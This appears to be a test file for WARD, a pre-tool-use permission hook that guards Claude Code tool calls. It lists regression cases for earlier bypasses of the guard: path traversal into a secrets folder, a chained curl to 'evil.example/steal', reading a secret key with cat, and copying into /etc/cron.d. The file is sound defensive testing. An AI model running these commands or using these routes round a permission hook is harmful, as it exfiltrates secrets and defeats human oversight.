// WARD pre-tool-use hook: decisions, plus end-to-end runs of the hook CLI
// with a real payload on stdin. The bypass cases are WARD-2026-001
// regressions (allowed before 0.3.0).
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { parseWard } from '@weave_protocol/ward';
import { evaluateCall } from '../dist/hook.js';

const WARD = `---
ward: "1.0"
agent: claude-code-test
---

## Filesystem

allow:
  - read: /workspace/**
  - write: /workspace/out/**
deny:
  - read: /workspace/secrets/**
default: deny

## Network

allow:
  - url: "https://api.github.com/**"
deny:
  - url: "https://evil.example/**"
default: deny

## Capabilities

allow:
  - file_read
  - file_write
  - file_list
  - shell_exec
  - http_request
  - mcp__files__*
default: deny
`;
const policy = parseWard(WARD);
const decide = (tool, input) => evaluateCall(policy, tool, input, '/workspace').decision;

describe('WARD-2026-001 bypasses are denied', () => {
  test('path traversal', () => {
    assert.equal(decide('Read', { file_path: '/workspace/out/../secrets/key' }), 'deny');
  });
  test('a second URL in a Bash command', () => {
    assert.equal(decide('Bash', { command: 'curl https://api.github.com/x && curl https://evil.example/steal' }), 'deny');
  });
  test('a Bash command reading a denied path', () => {
    assert.equal(decide('Bash', { command: 'cat /workspace/secrets/key' }), 'deny');
  });
  test('an MCP tool with a path argument', () => {
    assert.equal(decide('mcp__files__copy', { source: '/workspace/a', destination: '/etc/cron.d/x' }), 'deny');
  });
  test('Grep and Glob with a denied path', () => {
    assert.equal(decide('Grep', { pattern: 'KEY', path: '/workspace/secrets' }), 'deny');
    assert.equal(decide('Glob', { pattern: '*', path: '/workspace/secrets' }), 'deny');
  });
});

test('ordinary Claude Code calls are allowed', () => {
  assert.equal(decide('Read', { file_path: '/workspace/src/index.ts' }), 'allow');
  assert.equal(decide('Write', { file_path: '/workspace/out/a.md', content: 'curl https://evil.example' }), 'allow');
  assert.equal(decide('Bash', { command: 'npm test && git commit -m "fix a/b"' }), 'allow');
  assert.equal(decide('Read', { file_path: 'src/index.ts' }), 'allow', 'relative to cwd');
});

describe('hook CLI end to end', () => {
  const cli = resolve('dist/cli.js');
  const project = mkdtempSync(join(tmpdir(), 'cc-ward-'));
  writeFileSync(join(project, 'WARD.md'), WARD.replaceAll('/workspace', project));
  // Isolated config dir, so a real ~/.claude/WARD.md never leaks in
  const env = { PATH: process.env.PATH, HOME: project, CLAUDE_CONFIG_DIR: join(project, '.claude-config') };
  const hook = (payload, cwd = project) => {
    const r = spawnSync(process.execPath, [cli, 'hook', 'pre-tool-use'], { input: JSON.stringify({ cwd, ...payload }), env, encoding: 'utf8' });
    assert.equal(r.status, 0, r.stderr);
    return JSON.parse(r.stdout || '{}');
  };

  test('a denied call is blocked with the reason', () => {
    const out = hook({ tool_name: 'Bash', tool_input: { command: `curl https://api.github.com/x; curl https://evil.example/s` } });
    assert.equal(out.decision, 'block');
    assert.match(out.reason, /evil\.example/);
  });

  test('an allowed call passes silently', () => {
    assert.deepEqual(hook({ tool_name: 'Read', tool_input: { file_path: join(project, 'src', 'a.ts') } }), {});
  });

  test('an invalid WARD.md blocks instead of switching enforcement off', () => {
    const broken = mkdtempSync(join(tmpdir(), 'cc-ward-'));
    writeFileSync(join(broken, 'WARD.md'), '# not a policy');
    const out = hook({ tool_name: 'Read', tool_input: { file_path: join(broken, 'a') } }, broken);
    assert.equal(out.decision, 'block');
    assert.match(out.reason, /could not be loaded/);
  });

  test('no WARD.md anywhere means no enforcement', () => {
    const none = mkdtempSync(join(tmpdir(), 'cc-ward-'));
    assert.deepEqual(hook({ tool_name: 'Bash', tool_input: { command: 'ls' } }, none), {});
  });
});

// Session limits: WARD.md's maxToolCalls holds across separate hook processes, per
// session_id, through Ward's ledger (Ward 0.3.6).
test('session limits hold across hook processes', async () => {
  const { spawnSync: run } = await import('node:child_process');
  const { mkdtempSync: tmp, writeFileSync: write, mkdirSync: mk } = await import('node:fs');
  const { tmpdir: td } = await import('node:os');
  const { join: j, resolve: r } = await import('node:path');
  const ws = tmp(j(td(), 'limits-ws-'));
  const home = tmp(j(td(), 'limits-home-'));
  mk(j(ws, '.'), { recursive: true });
  write(j(ws, '.', 'WARD.md'), `---\nward: "1.0"\nagent: limits-e2e\n---\n\n## Filesystem\n\nallow:\n  - read: ${ws}/**\ndefault: deny\n\n## Capabilities\n\ndefault: allow\n\n## Behavioral Limits\n\nmaxToolCalls: 2\n`);
  const env = { PATH: process.env.PATH, HOME: home, WEAVE_LEDGER_DIR: j(home, 'ledger'), CLAUDE_CONFIG_DIR: j(home, '.claude') };
  const hook = (session) => {
    const out = run(process.execPath, [r('dist/cli.js'), 'hook', 'pre-tool-use'], { input: JSON.stringify({ cwd: ws, session_id: session, hook_event_name: 'PreToolUse', tool_name: 'Read', tool_input: { file_path: j(ws, 'a.txt') } }), env, encoding: 'utf8', cwd: ws });
    assert.equal(out.status, 0, out.stderr);
    return out.stdout;
  };
  assert.doesNotMatch(hook('one'), /Max tool calls/);
  assert.doesNotMatch(hook('one'), /Max tool calls/);
  assert.match(hook('one'), /Max tool calls/);
  assert.doesNotMatch(hook('two'), /Max tool calls/, 'another session has its own count');
});
